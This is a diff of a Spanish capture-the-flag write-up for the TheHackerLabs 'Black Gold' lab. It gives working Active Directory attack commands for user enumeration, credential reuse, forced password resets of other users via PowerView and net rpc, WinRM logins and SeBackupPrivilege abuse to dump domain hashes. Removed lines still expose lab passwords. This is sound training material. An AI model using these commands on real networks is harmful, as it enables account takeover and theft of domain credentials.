@@ -1,11 +1,11 @@
 ---
 layout: single
 title: Black Gold - TheHackerLabs
-excerpt: "."
+excerpt: "Esta es una máquina bastante difícil. Después de analizar los escaneos, iniciamos con la página web activa en el puerto 80, descubriendo que podemos descargar archivos PDF. Una vez descargador, analizamos sus metadatos con exiftool, notando que cada PDF tiene un nombre de usuario, así que aplicamos Fuzzing para comprobar si existen más PDFs, siendo así que descubrimos 188 PDFs. Creamos un script con Python para descargar todos estos PDFs y los analizamos todos con exiftool para obtener todos los nombres de usuarios, con tal de crear un wordlist de usuarios. Enumeramos Kerberos con kerbrute usando este wordlist, descubriendo un usuario válido. Después, analizamos el contenido de cada PDF con pdfgrep y descubrimos la contraseña de este usuario en un PDF. Utilizamos este usuario para enumerar el servicio RCP y LDAP, siendo así que descubrimos un usuario que agregó su contraseña en la descripción de su usuario. Utilizamos este segundo usuario para enumerar el servicio SMB, descubriendo un script de PowerShell que contiene otro usuario y contraseña. Con este último usuario, utilizamos bloodhound-python para obtener la data del AD, y a su vez, nos logueamos a la máquina víctima con evil-winrm. Analizando la data con BloodHound, encontramos que podemos cambiar la contraseña de otro usuario, ya que tenemos el permiso ForceChangePassword. Cambiándole la contraseña a este cuarto usuario y logueándonos con evil-winrm, descubrimos que este usuario tiene el privilegio SeBackupPrivilege, que podemos aprovechar para realizar una copia del archivo ntds.dit y system hive, con tal de poder dumpear sus hashes con impacket-secretsdump. Probando el Hash NTLM del Administrador, descubrimos que no funciona, por lo que decidimos aplicar el Golden Ticket Attack para suplantar al Administrador y poder loguearnos con impacket-psexec, logrando escalar privilegios y convirtiéndonos en Administrador."
 date: 2025-05-14
 classes: wide
 header:
-  teaser: /assets/images/THL-writeup-blackGold/_logo.png
+  teaser: /assets/images/THL-writeup-blackGold/blackGold.png
   teaser_home_page: true
   icon: /assets/images/thehackerlabs.jpeg
 categories:
@@ -16,25 +16,74 @@ tags:
   - Active Directory
   - Kerberos
   - SMB
-  - 
-  - 
-  - 
-  - 
-  - 
-  - 
+  - RPC
+  - LDAP
+  - WinRM
+  - Web Enumeration
+  - Fuzzing
+  - Python Automation
+  - PDF Metadata Analysis
+  - Kerberos Enumeration
+  - Information Leakage
+  - RPC Enumeration
+  - LDAP Enumeration
+  - SMB Enumeration
+  - BloodHound and bloodhound-python Enumeration
+  - Abusing ForceChangePassword Privilege
+  - Abusing SeBackupPrivilege Privilege
+  - Golden Ticket Attack
+  - Privesc - Golden Ticket Attack
   - OSCP Style
 ---
-![](/assets/images/THL-writeup-blackGold/_logo.png)
+<p align="center">
+<img src="/assets/images/THL-writeup-blackGold/blackGold.png">
+</p>
 
-texto
+
+Esta es una máquina bastante difícil. Después de analizar los escaneos, iniciamos con la página web activa en el **puerto 80**, descubriendo que podemos descargar archivos PDF. Una vez descargador, analizamos sus metadatos con **exiftool**, notando que cada PDF tiene un nombre de usuario, así que aplicamos **Fuzzing** para comprobar si existen más PDFs, siendo así que descubrimos 188 PDFs. Creamos un **script con Python** para descargar todos estos PDFs y los analizamos todos con **exiftool** para obtener todos los nombres de usuarios, con tal de crear un wordlist de usuarios. Enumeramos **Kerberos** con **kerbrute** usando este wordlist, descubriendo un usuario válido. Después, analizamos el contenido de cada PDF con **pdfgrep** y descubrimos la contraseña de este usuario en un PDF. Utilizamos este usuario para enumerar el **servicio RCP y LDAP**, siendo así que descubrimos un usuario que agregó su contraseña en la descripción de su usuario. Utilizamos este segundo usuario para enumerar el **servicio SMB**, descubriendo un **script de PowerShell** que contiene otro usuario y contraseña. Con este último usuario, utilizamos **bloodhound-python** para obtener la data del AD, y a su vez, nos logueamos a la máquina víctima con **evil-winrm**. Analizando la data con **BloodHound**, encontramos que podemos cambiar la contraseña de otro usuario, ya que tenemos el **permiso ForceChangePassword**. Cambiándole la contraseña a este cuarto usuario y logueándonos con **evil-winrm**, descubrimos que este usuario tiene el **privilegio SeBackupPrivilege**, que podemos aprovechar para realizar una copia del **archivo ntds.dit y system hive**, con tal de poder dumpear sus hashes con **impacket-secretsdump**. Probando el **Hash NTLM del Administrador**, descubrimos que no funciona, por lo que decidimos aplicar el **Golden Ticket Attack** para suplantar al Administrador y poder loguearnos con **impacket-psexec**, logrando escalar privilegios y convirtiéndonos en **Administrador**.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *arp-scan*
+* *wappalizer*
+* *exiftool*
+* *bash*
+* *gobuster*
+* *chmod*
+* *grep*
+* *sed*
+* *cut*
+* *sort*
+* *kerbrute_linux_amd64*
+* *pdfgrep*
+* *crackmapexec*
+* *rpcclient*
+* *netexec*
+* *ldapdomaindump*
+* *Python3*
+* *smbmap*
+* *bloodhound-python*
+* *evil-winrm*
+* *BloodHound*
+* *wget*
+* *PowerView.ps1*
+* *net*
+* *unix2dos*
+* *diskshadow*
+* *robocopy*
+* *reg*
+* *SeBackupPrivilegeCmdLets.dll*
+* *SeBackupPrivilegeUtils.dll*
+* *Copy-FileSebackupPrivilege*
+* *impacket-secretsdump*
+* *impacket-getPac*
+* *impacket-ticketer*
+* *export*
+* *klist*
+* *ntpdate*
+* *nslookup*
+* *impacket-psexec*
 
 
 <br>
@@ -56,17 +105,27 @@ Herramientas utilizadas:
 				<li><a href="#fuzz">Creando Wordlist de Fechas y Aplicando Fuzzing para Descubrir Nuevos PDFs</a></li>
 				<li><a href="#Automatizacion">Automatización de Descarga de Multiples Archivos PDF</a></li>
 				<li><a href="#Kerberos">Enumeración de Servicio Kerberos y Análisis de Contenido de PDFs</a></li>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#RPC">Enumeración de Servicio RPC</a></li>
+				<li><a href="#LDAP">Enumeración de Servicio LDAP</a></li>
+				<li><a href="#SMB">Enumeración de Servicio SMB y Ganando Acceso a la Máquina Víctima</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#BloodHound">Enumeración de AD con BloodHound</a></li>
+				<li><a href="#ForceChangePassword">Abusando de Permiso ForceChangePassword</a></li>
+				<ul>
+	                                <li><a href="#ForceChangePassword1">Abusando de Permiso ForceChangePassword de Manera Local</a></li>
+        	                        <li><a href="#ForceChangePassword2">Abusando de Permiso ForceChangePassword de Manera Externa</a></li>
+				</ul>
+				<li><a href="#Privesc">Abusando de Privilegio SeBackupPrivilege para Dumpear Hashes de Archivo ntds.dit</a></li>
+				<ul>
+        	                        <li><a href="#Hashes1">Metodo 1: Copiando Archivo ntds.dit con diskshadow y SYSTEM con reg save</a></li>
+	                                <li><a href="#Hashes2">Metodo 2: Copiando Archivos ntds.dit y SYSTEM Usando Archivos DLL</a></li>
+				</ul>
+				<li><a href="#GoldenTicket">Creando Golden Ticket para Autenticarnos Vía Kerberos como Administrador</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -101,7 +160,7 @@ Nmap done: 256 IP addresses (3 hosts up) scanned in 2.19 seconds
 Vamos a probar la herramienta **arp-scan**:
 ```bash
 arp-scan -I eth0 -g 192.168.56.0/24
-Interface: eth0, type: EN10MB, MAC: 08:00:27:8d:c1:60, IPv4: 192.168.56.102
+Interface: eth0, type: EN10MB
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 ...
 192.168.56.10	XX	PCS Systemtechnik GmbH
@@ -272,8 +331,12 @@ Nmap done: 1 IP address (1 host up) scanned in 94.88 seconds
 | *-p*       | Para indicar puertos específicos. |
 | *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
 
-Se puede ver el dominio de la máquina, siendo **neptune.thl**, que podemos registrar en el `/etc/hosts`.
-
+Se puede ver el dominio de la máquina, siendo **neptune.thl**, que podemos registrar en el `/etc/hosts`:
+```bash
+nano /etc/hosts
+---------------
+192.168.56.10 neptune.thl
+```
 Me da curiosidad que no reportó casi nada del **servicio SMB**, por lo que presiento que será complicado enumerarlo.
 
 Bien, me interesa bastante la página web del **puerto 80**, por lo que empezaremos por ahí.
@@ -314,7 +377,7 @@ Si bajamos un poco, encontraremos 2 PDFs que podemos descargar y ver:
 
 Estos son solamente informes y no tienen nada más.
 
-Entra en cada uno y descargalos:
+Entra en cada uno y descárgalos:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-blackGold/Captura4.png">
@@ -328,7 +391,7 @@ Antes de aplicar **Fuzzing**, podemos analizar si los PDFs tienen algo oculto en
 
 <h2 id="PDF">Analizando Metadatos de PDFs</h2>
 
-Probemos con cualquiera de los dos para ver que obtenemos:
+Probemos con cualquiera de los dos para ver qué obtenemos:
 ```bash
 exiftool 2024-02-15.pdf
 ExifTool Version Number         : 13.25
@@ -346,7 +409,7 @@ Create Date                     : 2024:02:15 04:00:00+01:00
 Author                          : James Clear
 Subject
 ```
-Me llama la atención que podemos ver el nombre de quien lo creo.
+Me llama la atención que podemos ver el nombre de quien lo creó.
 
 Veamos el otro PDF:
 ```bash
@@ -366,9 +429,9 @@ PDF Version                     : 1.5
 ```
 Parece que la versión del PDF varía, y también vemos otro nombre.
 
-Pensandolo un poco, podríamos tomar estos dos nombres y crear un wordlist de variaciones de usuario para ver si existe alguno registrado en el **servicio Kerberos** con **Kerbrute**.
+Pensándolo un poco, podríamos tomar estos dos nombres y crear un wordlist de variaciones de usuario para ver si existe alguno registrado en el **servicio Kerberos** con **Kerbrute**.
 
-La cuestión aquí, es que por el formato que tiene el nombre de cada PDF, nos da a entender que existen más PDFs del año 2024 o de otros años.
+La cuestión aquí es que, por el formato que tiene el nombre de cada PDF, nos da a entender que existen más PDFs del año 2024 o de otros años.
 
 Vamos a crear un wordlist con distintas fechas del 2020 al 2025, siguiendo el formato que tienen los PDFs y luego aplicaremos **Fuzzing** para ver si existen más.
 
@@ -388,7 +451,7 @@ while [[ "$fechas" < "$end" ]]; do
     fechas=$(date -I -d "$fechas + 1 day")
 done > wordlistFechas.txt
 ```
-Este script toma como rango de inicio la fecha `2020-01-01` y como rango final `2025-12-31`. Estos rangos se utilizan dentro de un bucle que estara creando las fechas en cada vuelta, utilizando el comando **date** y a cada fecha se le agrega la extensión `.pdf`.
+Este script toma como rango de inicio la fecha `2020-01-01` y como rango final `2025-12-31`. Estos rangos se utilizan dentro de un bucle que estará creando las fechas en cada vuelta, utilizando el comando **date** y a cada fecha se le agrega la extensión `.pdf`.
 
 Cuando termine el bucle, los resultados se guardan en un archivo llamado **wordlistFechas.txt**.
 
@@ -435,9 +498,9 @@ Finished
 ```
 Encontramos bastantes archivos, siendo un total de 189 archivos. Además, parece que los archivos son de un rango del 2023 al 2024.
 
-La cuestion aquí es como le haremos para descargar todos los PDFs y analizar cada uno.
+La cuestión aquí es cómo le haremos para descargar todos los PDFs y analizar cada uno.
 
-Toca automatizar esto con **Python**
+Toca automatizar esto con **Python**.
 
 <br>
 
@@ -451,23 +514,23 @@ import os
 import requests
 from datetime import datetime, timedelta
 
-# Variables Globales
-start_date = datetime(2023, 1, 1)
-end_date = datetime(2024, 12, 31)
-base_url = "http://192.168.56.10/docs/"
+# Variables
+inicio = datetime(2023, 1, 1)
+fin = datetime(2024, 12, 31)
+url_base = "http://192.168.56.10/docs/"
 
 # Creación de directorio donde se guardan PDFs
-output_dir = "pdfs_descargados"
-os.makedirs(output_dir, exist_ok=True)
+directorio = "pdfs_descargados"
+os.makedirs(directorio, exist_ok=True)
 
 print("Descargando archivos PDF...")
 
 # Busqueda y Descarga
-current_date = start_date
-while current_date <= end_date:
-    filename = current_date.strftime("%Y-%m-%d") + ".pdf"
-    file_url = base_url + filename
-    local_path = os.path.join(output_dir, filename)
+fecha_actual = inicio
+while fecha_actual <= fin:
+    filename = fecha_actual.strftime("%Y-%m-%d") + ".pdf"
+    file_url = url_base + filename
+    local_path = os.path.join(directorio, filename)
 
     try:
         response = requests.get(file_url)
@@ -477,26 +540,26 @@ while current_date <= end_date:
     except:
         pass  # Ignorar errores
 
-    current_date += timedelta(days=1)
+    fecha_actual += timedelta(days=1)
 
 print("Descarga finalizada.")
 ```
-Explicando la Busqueda y Descarga:
+Explicando la Búsqueda y Descarga:
 
 * Declaramos las variables globales, donde definimos los rangos de fechas y la URL a usar.
-* Se crea el directorio **pdfs_descargados**, pues ahí se guardaran los archivos.
-* Inicia la variable **current_date** para utilizar el valor de la variable **start_date**, que sería `2023-01-01`. 
+* Se crea el directorio **pdfs_descargados**, pues ahí se guardarán los archivos.
+* Inicia la variable **fecha_actual** para utilizar el valor de la variable **inicio**, que sería `2023-01-01`. 
 * Crea un bucle para tomar los rangos de fechas del año 2023 al 2024.
 * Crea las fechas en formato **YYYY-MM-DD** y les agrega la extensión **.pdf** dentro de la variable **filename**.
 * La variable **file_url** crea la URL juntando la URL base y el contenido de la variable **filename**, que son las fechas.
 * La variable **local-path** genera la ruta local donde se guardará el archivo descargado, por ejemplo, `pdfs_descargados/2023-01-01.pdf`.
 * Intenta hacer una **petición GET** a la URL creada y si responde con un **código 200**, se crea un archivo con el nombre correspondiente en modo binario (**wb**) y escribe el contenido descargado en él.
-* Si hay algún error, los ignora y continua.
-* En cada vuelta del bucle, se le suma un día actual a la fecha que se esta ocupando en la variable **current_date**, hasta que se llegue al rango final del bucle.
+* Si hay algún error, los ignora y continúa.
+* En cada vuelta del bucle, se le suma un día actual a la fecha que se está ocupando en la variable **fecha_actual**, hasta que se llegue al rango final del bucle.
 
 <br>
 
-Listo, una vez que ejecutes el script, podremos ver el directorio **pdfs_descargados** y veremos 188 **PDFs**.
+Listo, una vez que ejecutes el script, podremos ver el directorio **pdfs_descargados** y veremos **188 PDFs**.
 
 Podemos analizar todos los PDFs con **exiftool** a la vez y aplicamos algunos filtros, para que solamente obtengamos lo que hay en las etiquetas **Author y Creator**:
 ```bash
@@ -538,7 +601,7 @@ La puedes instalar de esta forma:
 apt install pdfgrep
 ```
 
-Y tan solo tenemos que indicar que es lo que buscamos, por ejemplo, la palabra **contraseña**:
+Y tan solo tenemos qué indicar que es lo que buscamos, por ejemplo, la palabra **contraseña**:
 ```bash
 pdfgrep -i "contraseña" pdfs_descargados/*.pdf
 pdfs_descargados/2023-01-12.pdf:   ●​ Contraseña temporal: ************ (Por favor, cambia esta
@@ -555,11 +618,17 @@ Con lo que tenemos, podemos comprobar si la contraseña sirve contra el **usuari
 ```bash
 crackmapexec smb 192.168.56.10 -u 'Lucas.Miller' -p '**************'
 SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False)
-SMB         192.168.56.10   445    DC01             [+] neptune.thl\Lucas.Miller:E@6q%TnR7UEQSXywr8^@
+SMB         192.168.56.10   445    DC01             [+] neptune.thl\Lucas.Miller:********
 ```
 Genial, podemos seguir con el **servicio SMB**.
 
-Pero de una vez te digo, que no encontraremos nada en el **SMB**, aunque quizá encontremos algo en el **servicio RPC**.
+Y como no habíamos analizado antes el **SMB**, podemos ver el nombre del servidor del DC, así que registralo en el `/etc/hosts`:
+```bash
+nano /etc/hosts
+--------------
+192.168.56.10 neptune.thl DC01.neptune.thl
+```
+Listo, continuemos.
 
 
 <br>
@@ -573,7 +642,7 @@ Pero de una vez te digo, que no encontraremos nada en el **SMB**, aunque quizá 
 
 <h2 id="RPC">Enumeración de Servicio RPC</h2>
 
-Tengo entendido que nos podemos autenticar en **SMB y RPC** con la mismas credenciales, ya que ambos trabajan de la mano.
+Tengo entendido que nos podemos autenticar en **SMB y RPC** con las mismas credenciales, ya que ambos trabajan de la mano.
 
 Comprobémoslo entrando al **servicio RPC** con la herramienta **rpcclient**:
 ```batch
@@ -630,23 +699,23 @@ index: 0xfb3 RID: 0x451 acb: 0x00000210 Account: lucas.miller	Name: Lucas Miller
 index: 0xfb6 RID: 0x454 acb: 0x00000210 Account: thomas.brown	Name: Thomas Brown	Desc: (null)
 index: 0xfb4 RID: 0x452 acb: 0x00000210 Account: victor.rodriguez	Name: Victor Rodriguez	Desc: My Password is *******
 ```
-Genial, parece que el **usuario victor.rodriguez** dejo su contraseña en la descripción de su usuario.
+Genial, parece que el **usuario victor.rodriguez** dejó su contraseña en la descripción de su usuario.
 
-Comprobémos que funciona con **crackmapexec**:
+Comprobemos que funciona con **crackmapexec**:
 ```bash
 crackmapexec smb 192.168.56.10 -u 'victor.rodriguez' -p '********'
 SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False)
 SMB         192.168.56.10   445    DC01             [+] neptune.thl\victor.rodriguez:*********
 ```
-Si funciona esta contraseña.
+Sí funciona esta contraseña.
 
 Antes de ir al **SMB**, apliquemos enumeración al **servicio LDAP**.
 
 <br>
 
-<h2 id="">Enumeración de Servicio LDAP</h2>
+<h2 id="LDAP">Enumeración de Servicio LDAP</h2>
 
-Al aplicar esta enumeración, podemos ver de manera más grafica, la información del dominio, como los grupos y usuarios existentes.
+Al aplicar esta enumeración, podemos ver, de manera más gráfica, la información del dominio, como los grupos y usuarios existentes.
 
 Podemos probar la contraseña de cualquier usuario que tenemos, para ver si funcionan contra el **servicio LDAP** con la herramienta **netexec**:
 ```bash
@@ -693,9 +762,9 @@ Revisemos el archivo **domain_users.html**:
 <img src="/assets/images/THL-writeup-blackGold/Captura7.png">
 </p>
 
-Vemos claramente los usuarios y a que grupos pertenecen.
+Vemos claramente los usuarios y a qué grupos pertenecen.
 
-Ahí está el usuario **victor.rodriguez** que pertenece al **grupo IT**, vemos otros dos usuarios que también pertenecen a este grupo y al **grupo Remote Management Users** al que podemos entrar con la herramienta **evil-winrm**.
+Ahí está el usuario **victor.rodriguez** que pertenece al **grupo IT**. Vemos otros dos usuarios que también pertenecen a este grupo y al **grupo Remote Management Users** al que podemos entrar con la herramienta **evil-winrm**.
 
 <br>
 
@@ -760,7 +829,7 @@ $sourceDirectory = "C:\Confidenciales"
 $destinationDirectory = "E:\Backups\Confidenciales"
 
 $username = "emma.johnson"
-$password = ConvertTo-SecureString "sb9TVndq8N@tUVMmP2@#" -AsPlainText -Force
+$password = ConvertTo-SecureString "contraseña_emma.johnson" -AsPlainText -Force
 $credentials = New-Object System.Management.Automation.PSCredential($username, $password)
 
 $emailFrom = "emma.johnson@neptune.thl"
@@ -773,7 +842,7 @@ $emailSubject = "Notificación de Backup Completo"
 ```
 Si recordamos, ese usuario pertenece al **grupo Remote Maganement Users**.
 
-Comprobémos si podemos usar estas credenciales para entrar a la máquina víctima con la herramienta **evil-winrm**:
+Comprobemos si podemos usar estas credenciales para entrar a la máquina víctima con la herramienta **evil-winrm**:
 ```bash
 crackmapexec winrm 192.168.56.10 -u 'emma.johnson' -p '************'
 SMB         192.168.56.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)
@@ -782,6 +851,8 @@ WINRM       192.168.56.10   5985   DC01             [+] neptune.thl\emma.johnson
 ```
 Excelente, las podemos usar.
 
+<br>
+
 -----------------
 **IMPORTANTE**
 
@@ -789,11 +860,11 @@ Antes de loguearnos en la máquina con las credenciales del **usuario emma.johns
 
 Esto lo hacemos, ya que existen permisos que tiene el **usuario emma.johnson** que, por alguna razón, se eliminan una vez que entras por **evil-winrm** a la máquina.
 
-Más adelante, veremos que permisos son.
+Más adelante, veremos qué permisos son.
 
 Obtengamos la data:
 ```bash
-bloodhound-python -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#' -d neptune.thl -dc DC01.neptune.thl -ns 192.168.56.10 --zip -c all
+bloodhound-python -u 'emma.johnson' -p 'contraseña_emma.johnson' -d neptune.thl -dc DC01.neptune.thl -ns 192.168.56.10 --zip -c all
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: neptune.thl
 INFO: Getting TGT for user
@@ -815,12 +886,13 @@ INFO: Compressing output into 20250513020845_bloodhound.zip
 ```
 Listo.
 
-
 -----------------
+
+<br>
 
 Ahora sí, entremos a la máquina:
 ```batch
-evil-winrm -i 192.168.56.10 -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#'
+evil-winrm -i 192.168.56.10 -u 'emma.johnson' -p '***********'
 Evil-WinRM shell v3.7
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
@@ -830,7 +902,7 @@ Info: Establishing connection to remote endpoint
 ```
 
 Y en el Escritorio encontramos la flag del usuario:
-```bash
+```batch
 *Evil-WinRM* PS C:\Users\Emma Johnson\Documents> cd ../Desktop
 *Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> type user.txt
 ...
@@ -846,16 +918,10 @@ Y en el Escritorio encontramos la flag del usuario:
 <br>
 
 
-<h2 id="BloodHound">Enumeración de AD con BloodHound y bloodhound-python</h2>
+<h2 id="BloodHound">Enumeración de AD con BloodHound</h2>
 
-Antes de entrar a la máquina, ya debiste haber obtenido la data del AD con **bloodhound-python**.
-
-Si ya lo hiciste, continua. En caso de que no, tendras que eliminar y volver a instalar la **máquina Black Gold**.
-
-Continuemos.
-
-Si revisamos los privilegios de **emma.johnson**, no tendra alguno que nos pueda ayudar:
-```bash
+Si revisamos los privilegios de **emma.johnson**, no tendrá alguno que nos pueda ayudar:
+```batch
 *Evil-WinRM* PS C:\Users\Emma Johnson\Documents> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -874,9 +940,9 @@ Primero, marquemos los usuarios de los que somos dueños y revisemos su informac
 
 Si te diste cuenta, ninguno de los que tenemos tiene algo que nos ayude en algo, a excepción del usuario **emma.johnson**.
 
-Viendo su información, casi al final encontramos el **nodo Outbound Object Control**, observa que este usuario tiene la capacidad de modificar 1 objeto del **First Degree Object Control**.
+Viendo su información, casi al final encontramos el **nodo Outbound Object Control**. Observa que este usuario tiene la capacidad de modificar 1 objeto del **First Degree Object Control**.
 
-Dandole click, nos mostrara esto:
+Dándole click, nos mostrará esto:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-blackGold/Captura8.png">
@@ -884,7 +950,23 @@ Dandole click, nos mostrara esto:
 
 Parece que tenemos el permiso **ForceChangePassword**.
 
-Investiguemos que es:
+<br>
+
+------------
+**NOTA**
+Este es el permiso que deberías encontrar.
+
+En caso de que no lo tenga el usuario **emma.johnson**, deberás eliminar y volver a instalar la **máquina Black Gold**.
+
+Hazlo, hasta que encuentres ese permiso. Si no, no podrás avanzar.
+
+-----------
+
+<br>
+
+<h2 id="ForceChangePassword">Abusando de Permiso ForceChangePassword</h2>
+
+Investiguemos qué es:
 
 | **Permiso ForceChangePassword** |
 |:-----------:|
@@ -907,16 +989,21 @@ Apliquemos ambas.
 <h3 id="ForceChangePassword1">Abusando de Permiso ForceChangePassword de Manera Local</h3>
 
 Para realizar esto, necesitamos de la herramienta **PowerView.ps1**, que puedes descargar aquí:
-* 
+* <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank">Repositorio de PowerShellMafia: PowerView.ps1</a>
 
-Una vez que lo tengas, cargalo a la sesión de **evil-winrm**:
+Lo puedes descargar con **wget**:
 ```bash
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
+```
+
+Una vez que lo tengas, cárgalo a la sesión de **evil-winrm**:
+```batch
 *Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> upload powerview.ps1
-Info: Uploading /../TheHackersLabs/BlackGold/content/powerview.ps1 to C:\Users\Emma Johnson\Desktop\powerview.ps1
+Info: Uploading /../TheHackersLabs/BlackGold/content/powerview.ps1 to C:\Users\Emma Johnson\Desktop\PowerView.ps1
 Data: 1217440 bytes of 1217440 bytes copied
 Info: Upload successful!
 .
-*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> Import-Module .\powerview.ps1
+*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> Import-Module .\PowerView.ps1
 ```
 
 Ahora, debemos seguir los pasos que nos indica **BloodHound**:
@@ -926,22 +1013,21 @@ Ahora, debemos seguir los pasos que nos indica **BloodHound**:
 </p>
 
 Apliquémoslos:
-
-```bash
+```batch
 *Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> $SecPassword = ConvertTo-SecureString 'contraseña_emma.johnson' -AsPlainText -Force
 *Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> $Cred = New-Object System.Management.Automation.PSCredential('neptune.thl\emma.johnson', $SecPassword)
 *Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> $UserPassword = ConvertTo-SecureString 'Hackeado123!' -AsPlainText -Force
 *Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> Set-DomainUserPassword -Identity thomas.brown -AccountPassword $UserPassword -Credential $Cred
 ```
 
-Analicemos que hicimos:
+Analicemos lo que hicimos:
 
 * El primer comando convierte la contraseña de **emma.johnson** en un objeto **SecureString**, que es requerido por muchos cmdlets que manejan contraseñas de forma segura.
 * El segundo comando crea un objeto **PSCredential** que almacena el nombre de usuario `'neptune.thl\emma.johnson'` y la contraseña `$SecPassword` (ya convertida a **SecureString**)
 * El tercer comando crea otra contraseña en formato **SecureString** con el valor `'Hackeado123!'`, que será la nueva contraseña para el **usuario thomas.brown**.
 * El cuarto comando le dice a **PowerShell** (con la ayuda de **PowerView**) que, cambie la contraseña del **usuario thomas.brown**, establezca como nueva contraseña `Hackeado123!` y se las credenciales de **emma.johnson** para hacerlo (`-Credential $Cred`).
 
-Podemos comprobar que funciono el cambio con **netexec**:
+Podemos comprobar que funcionó el cambio con **netexec**:
 ```bash
 netexec winrm 192.168.56.10 -u 'thomas.brown' -p 'Hackeado123!'
 WINRM       192.168.56.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)
@@ -950,7 +1036,7 @@ WINRM       192.168.56.10   5985   DC01             [+] neptune.thl\thomas.brown
 Genial.
 
 Ya solo nos logueamos en una nueva sesión de **evil-winrm** usando al **usuario thomas.brown**:
-```bash
+```batch
 evil-winrm -i 192.168.56.10 -u 'thomas.brown' -p 'Hackeado123!'
 Evil-WinRM shell v3.7
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
@@ -963,19 +1049,19 @@ neptune\thomas.brown
 
 <br>
 
-<h3 id="ForceChangePassword1">Abusando de Permiso ForceChangePassword de Manera Externa</h3>
+<h3 id="ForceChangePassword2">Abusando de Permiso ForceChangePassword de Manera Externa</h3>
 
 Veamos las instrucciones de **BloodHound**:
 
 <p align="center">
-<img src="/assets/images/THL-writeup-blackGold/Captura9.png">
+<img src="/assets/images/THL-writeup-blackGold/Captura11.png">
 </p>
 
 Necesitamos utilizar la herramienta **net** que es de **Samba** para poder cambiar la contraseña del usuario.
 
 Únicamente copiamos el comando en nuestro kali y lo modificamos para agregar la contraseña de **emma.johnson**:
 ```bash
-net rpc password "thomas.brown" "newP@ssword2022" -U "neptune.thl"/"emma.johnson"%"sb9TVndq8N@tUVMmP2@#" -S "192.168.56.10"
+net rpc password "thomas.brown" "newP@ssword2022" -U "neptune.thl"/"emma.johnson"%"contraseña_emma.johnson" -S "192.168.56.10"
 ```
 Listo.
 
@@ -987,7 +1073,7 @@ WINRM       192.168.56.10   5985   DC01             [+] neptune.thl\thomas.brown
 ```
 
 Ahora nos logueamos como este usuario:
-```bash
+```batch
 evil-winrm -i 192.168.56.10 -u 'thomas.brown' -p 'Hackeado123!'
 Evil-WinRM shell v3.7
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
@@ -1000,10 +1086,10 @@ Estamos dentro.
 
 <br>
 
-<h2 id="Privesc">Escalando Privilegios Abusando de Privilegio </h2>
+<h2 id="Privesc">Abusando de Privilegio SeBackupPrivilege para Dumpear Hashes de Archivo ntds.dit</h2>
 
 Si revisamos los privilegios de este usuario, descubrimos que tiene el privilegio **SeBackupPrivilege**:
-```bash
+```batch
 *Evil-WinRM* PS C:\Users\thomas.brown\Desktop> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -1019,6 +1105,12 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
+E incluso, lo podemos ver en **BloodHound**, ya que este usuario pertenece al **grupo Backup Operators**:
+
+<p align="center">
+<img src="/assets/images/THL-writeup-blackGold/Captura12.png">
+</p>
+
 Investiguemos este privilegio:
 
 | **Privilegio SeBackupPrivilege** |
@@ -1027,14 +1119,12 @@ Investiguemos este privilegio:
 
 <br>
 
-Buscando por ahí, encontramos el siguiente blog que nos muestra dos metodos que podemos usar para escalar privilegios, si nuestro usuario tiene los privilegios **SeBackupPrivilege y SeRestorePrivilege**:
+Buscando por ahí, encontramos el siguiente blog que nos muestra dos métodos que podemos usar para escalar privilegios, si nuestro usuario tiene los privilegios **SeBackupPrivilege y SeRestorePrivilege**:
 * <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" target="_blank">Windows Privilege Escalation: SeBackupPrivilege</a>
 
-Resumiendo un poco el articulo, la idea es aprovecharnos de estos privilegios para poder extraer los hashes del **archivo ntds.dit** realizando copias de este archivo y del archivo **SYSTEM** del dominio.
+Resumiendo un poco el artículo, la idea es aprovecharnos de estos privilegios para poder extraer los hashes del **archivo ntds.dit** realizando copias de este archivo y del archivo **System Hive** de la máquina.
 
-Para que ambos métodos funcionen, necesitamos crear un archivo **Distributed Shell (DSH)**, 
-
